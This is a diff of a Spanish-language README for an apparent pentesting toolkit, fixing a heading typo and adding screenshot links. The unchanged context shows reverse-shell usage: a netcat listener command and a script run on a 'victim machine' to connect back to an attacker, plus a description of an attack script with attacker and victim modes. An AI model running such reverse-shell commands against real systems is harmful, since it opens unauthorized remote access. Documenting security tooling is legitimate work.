@@ -374,18 +374,20 @@ if __name__ == '__main__':
     ejecutar_opciones()
 
 ```
-## Uso modo LazeReverseShell
+## Uso modo LazyReverseShell
 primero nos ponemos en escucha con el comando 
 
 
 ```sh
 nc -nlvp 1337 #o el puerto que escojamos 
 ```
+![image](https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5)
 
 para luego en la maquina victima 
 ```sh
 ./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
 ```
+![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)
 
 ## Uso modo LazyAtack
 Este script de pentesting en Bash permite ejecutar una serie de pruebas de seguridad en modo servidor (máquina víctima) o en modo cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece diferentes opciones y funcionalidades para llevar a cabo diversas acciones de prueba de penetración.
